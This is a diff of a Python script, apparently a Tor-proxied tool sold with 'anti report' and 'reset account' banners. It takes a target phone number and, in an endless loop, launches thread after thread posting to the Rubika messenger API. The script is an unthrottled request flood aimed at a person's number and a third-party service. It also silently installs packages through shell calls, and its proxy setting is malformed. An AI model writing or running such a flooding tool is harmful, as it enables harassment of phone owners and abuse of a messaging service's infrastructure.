@@ -1,50 +1,69 @@
+# Connect to the tor first, then set the port and IP, then run the script
+# python
 import os
-import time
-import requests
-import sys
+# ------- imports ----
+# !! colors !!
+import time,sys
+green="\033[32m"
+red ="\033[31m"
+blue="\033[36m"
+pink="\033[35m"
+yellow="\033[93m"
+darkblue="\033[34m"
+white="\033[00m"
+# !!   !!
+# ---- try ---
+try:
+    import requests
+except:
+    os.system("pip install requests")
+try:
+    from threading import Thread
+except:
+    os.system("pip install threading")
+
 from threading import Thread
-from colorama import Fore
 from time import sleep
+import requests
+# ///// the proxy ////
 proxy = {"https": "127.0.0.1.8000"}
-os.system("pkg install tor")
-os.system("pip install requests")
-os.system("clear")
-print(Fore.GREEN)
-print("""                 F / H 
-""")
+# /////////
+try:
+    os.system("pkg install tor")
+except:
+    print ()
+try:
+    os.system("clear")
+except:
+    os.system("cls")
 sleep(1)
-os.system("clear")
-print(Fore.BLUE)
-time.sleep(0.5)
-print ("yes")
-m = """
+print(F'{blue}')
+print('\nF/H\n')
+sleep(1)
+m = f"""\n\n{darkblue}
+_____________________
+[power reset account]
+—————————————————————
 
-
-reset account
-
-
-/////////////////////
-//////////un username
-///////////////////
-/////////anti report
-||||||||||||||||||||||||||||
-//////////////////
-////main no filtering, anti report
+{green}
+/////////////////////////////////////////
+//////////{blue}anti filter{green} //////////
+///////////////////////////////////////
+/////////{blue}anti report{green} /////////
+||||||||||||||||||||||||||||||||||||||
+//////////////////////////////////////
+////{blue}main no filtering, anti report{green}
+/////////////////////////////////////////
+\n
 """
 for m in m:
         sys.stdout.write(m)
         sys.stdout.flush()
         time.sleep(0.03)
 
-print ("")
-print (Fore.YELLOW)
-time.sleep(1)
+sleep(1)
 print ()
-
-
-#kh kh kh
-
-
+# ---------- rubika ---------
 def rubika(phone):
     #rubika api
     ruH = {"Host": "messengerg2c4.iranlms.ir","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "text/plain","origin": "https://web.rubika.ir","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.rubika.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}
@@ -52,37 +71,31 @@ def rubika(phone):
     try:
         ruR = requests.post("https://messengerg2c4.iranlms.ir/", headers=ruH, json=ruD, proxies=proxy)
         if "OK" in ruR.text:
-            print ("ok thanks")
+            print (f"{pink}[+]elimination filtered")
         else:
-            print ("REPORTING USER")
+            print (f"{pink}[!] {blue}anti report...")
     except:
-        print ("req=ok user report by ryson no")
+        print (f"{pink}[!] {blue}anti report...")
 
 def main():
-    phone = str(input("""
+    phone = str(input(f"""\n\n
+{white}
 ~~~~~~~~~~~~~~~~~~~
 |||||||||||||||||||
 |||====||★||====|||
 |||====||★||====|||
-||| black mester |||
+||| {yellow}black mester {white}|||
 |||||||||||||||||||
 |||||||||||||||||||
 |||||||||||||||||||
 ~~~~~~~~~~~~~~~~~~~
-
-#666
-
 
 
              
-          Number-reported for anti report [+98XXXXX] ⟩⟩⟩ """))
+{green}phone number reported on rubika for elimination report {red}[+98XXXXX] {darkblue}⟩⟩⟩ {blue}"""))
     while True:
         Thread(target=rubika, args=[phone]).start()
-        os.system("killall -HUP tor")
-        time.sleep(3)
 
 
 if __name__ == "__main__":
     main()
-
-os.system("tor")
